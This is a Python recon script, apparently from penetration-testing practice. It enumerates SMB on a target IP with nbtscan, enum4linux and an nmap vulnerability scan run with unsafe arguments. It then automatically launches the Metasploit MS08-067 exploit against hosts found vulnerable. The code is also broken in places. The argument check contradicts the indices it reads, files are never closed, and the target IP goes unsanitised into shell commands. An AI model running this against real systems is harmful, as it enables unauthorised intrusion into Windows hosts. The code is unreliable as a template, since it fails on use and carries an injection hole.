#!/usr/bin/python
import sys
import subprocess

def main(args):
	if len(args) != 2:
		print("Usage: smbrecon.py <ip address>")
		sys.exit(0)

	ip = args[1]
	port = args[2]
	msf = args[3]
	print("INFO: Starting nbtscan on " + ip)
	NBTSCAN = "nbtscan -r %s" % (ip)
	nbtresults = subprocess.check_output(NBTSCAN, shell=True)
	if ("Connection refused" not in nbtresults) and ("Connect error" not in nbtresults) and ("Connection reset" not in nbtresults):
		print("FOUND: NBTSCAN User accounts/domains found on " + ip + "check discovery/smb for results")
		resultsfile = "discovery/smb/" + ip + "_nbtscan.txt"
		f = open(resultsfile, "w")
		f.write(nbtresults)
		f.close

	print("INFO: Starting enum4linux on " + ip)
	NBTSCAN = "enum4linux -a %s" % (ip)
	nbtresults = subprocess.check_output(NBTSCAN, shell=True)
	if ("Connection refused" not in nbtresults) and ("Connect error" not in nbtresults) and ("Connection reset" not in nbtresults):
		print("FOUND: ENUM4LINUX User accounts/domains found on " + ip + "check discovery/smb for results")
		resultsfile = "discovery/smb/" + ip + "_enum4linux.txt"
		f = open(resultsfile, "w")
		f.write(nbtresults)
		f.close

	print("INFO: Running nmap smb vuln scan on " + ip)
	NBTSCAN = "nmap -Pn -n --open -p %s --script=smb-check-vulns --script-args=unsafe=1 %s" % (port, ip)
	nbtresults = subprocess.check_output(NBTSCAN, shell=True)
	lines = nbtresults.split("\n")
	for line in lines:
		print line
		if "VULNERABLE" in line and "NOT VULNERABLE" not in line:
			print("FOUND SMB VULN on " +ip+ ": " +line)
		if msf:
			if "MS08-067:" in line and "VULNERABLE" in line and "NOT" not in line:
				print("Exploiting MS08-067")
				cmd = "gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi RHOST=" + ip + " E"
				subprocess.call(cmd.split(" "))
	resultsfile = "discovery/smb/" + ip + "_nse.txt"
	f = open(resultsfile, "w")
	f.write(nbtresults)
	f.close

if __name__=='__main__':
	main(sys.argv)



